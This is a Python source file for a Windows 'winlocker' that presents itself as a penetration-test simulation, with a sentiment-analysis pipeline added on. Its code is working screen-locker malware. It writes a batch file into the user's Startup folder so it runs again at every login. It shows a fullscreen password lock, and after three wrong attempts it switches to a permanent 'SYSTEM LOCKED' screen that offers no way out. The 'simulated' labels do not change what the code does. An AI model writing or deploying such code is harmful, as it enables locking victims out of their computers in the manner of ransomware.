#! /usr/bin/env python
# -*- coding: utf-8 -*-
import getpass
import os
from tkinter import Tk, Label, Button, Entry, messagebox
from transformers import pipeline
from datetime import datetime
import hashlib
import re

class MachineLearningWinlocker:
    def __init__(self):
        # User and path setup
        self.user_name = getpass.getuser()
        self.startup_path = fr"C:\Users\{self.user_name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

        # Hugging Face pipeline
        try:
            self.sentiment_analyzer = pipeline("sentiment-analysis")
            print("[+] Sentiment analysis pipeline loaded.")
        except Exception as e:
            print(f"[-] Error loading sentiment analysis pipeline: {e}")
            self.sentiment_analyzer = None

        # Security variables
        self.salt = "unique_salt"
        self.hashed_password = self.hash_password("test_password")
        self.failed_attempts = []
        self.attempt_limit = 3
        self.remaining_attempts = self.attempt_limit

    def hash_password(self, password):
        """Hashes the password with a salt."""
        return hashlib.sha256((self.salt + password).encode()).hexdigest()

    def validate_password(self, input_password):
        """Validates the user input password."""
        return self.hash_password(input_password) == self.hashed_password

    def log_attempt(self, input_password):
        """Logs failed attempts."""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        masked_password = "*" * len(input_password)
        self.failed_attempts.append((timestamp, masked_password))
        print(f"[-] Failed attempt logged: {timestamp} - {masked_password}")

    def add_persistence(self, script_path):
        """Adds persistence by simulating startup script creation."""
        try:
            with open(os.path.join(self.startup_path, "open.bat"), "w+") as bat_file:
                bat_file.write(f'start "" {script_path}')
            print("[+] Startup persistence simulated.")
        except Exception as e:
            print(f"[-] Error creating startup script: {e}")

    def remove_persistence(self):
        """Removes the simulated persistence."""
        try:
            os.remove(os.path.join(self.startup_path, "open.bat"))
            print("[+] Startup persistence removed.")
        except FileNotFoundError:
            print("[-] Startup script not found.")
        except Exception as e:
            print(f"[-] Error removing startup script: {e}")

    def analyze_input(self, user_input):
        """Analyzes input using sentiment analysis."""
        if not self.sentiment_analyzer:
            print("[-] Sentiment analyzer is unavailable.")
            return

        try:
            # Clean and validate input using regular expressions
            user_input = re.sub(r"[^a-zA-Z0-9\s.,!?]", "", user_input)
            result = self.sentiment_analyzer(user_input)
            sentiment = result[0]
            print(f"[+] Input analysis: {user_input}")
            print(f"    Sentiment: {sentiment['label']} (Score: {sentiment['score']:.2f})")

            # Handle negative sentiment
            if sentiment["label"] == "NEGATIVE":
                print("[!] Suspicious or hostile input detected.")
            else:
                print("[+] Input seems normal.")
        except Exception as e:
            print(f"[-] Error analyzing input: {e}")

    def lock_screen(self):
        """Displays a simulated lock screen GUI."""
        root = Tk()
        root.title("Penetration Test: System Locked")
        root.attributes("-fullscreen", True)

        # GUI elements
        Label(root, text="System Locked - Penetration Testing", font=("Arial", 24), bg="red", fg="white").pack(pady=20)
        Label(root, text="Enter your password to unlock", font=("Arial", 18), bg="black", fg="white").pack(pady=20)

        password_entry = Entry(root, show="*", font=("Arial", 18))
        password_entry.pack(pady=20)

        def attempt_unlock():
            nonlocal password_entry
            input_password = password_entry.get()
            if self.validate_password(input_password):
                messagebox.showinfo("Unlocked", "System successfully unlocked!")
                root.destroy()
            else:
                self.remaining_attempts -= 1
                self.log_attempt(input_password)
                password_entry.delete(0, "end")
                if self.remaining_attempts <= 0:
                    self.trigger_safe_lock(root)
                else:
                    messagebox.showwarning(
                        "Failed", f"Incorrect password. Attempts left: {self.remaining_attempts}"
                    )

        Button(
            root, text="Unlock", font=("Arial", 18), command=attempt_unlock
        ).pack(pady=20)

        root.mainloop()

    def trigger_safe_lock(self, root):
        """Triggers a permanent lock screen."""
        for widget in root.winfo_children():
            widget.destroy()
        Label(root, text="SYSTEM LOCKED", font=("Arial", 40), bg="black", fg="red").pack(expand=True)

    def cleanup(self):
        """Performs cleanup actions."""
        self.remove_persistence()
        print("[+] Cleanup complete.")


if __name__ == "__main__":
    # Initialize the winlocker
    winlocker = MachineLearningWinlocker()

    # Add persistence
    script_path = os.path.abspath(__file__)
    winlocker.add_persistence(script_path)

    # Lock screen simulation
    winlocker.lock_screen()

    # Input analysis
    inputs = ["I hate this program!", "This is interesting.", "Terminate the session!"]
    for user_input in inputs:
        winlocker.analyze_input(user_input)

    # Cleanup
    winlocker.cleanup()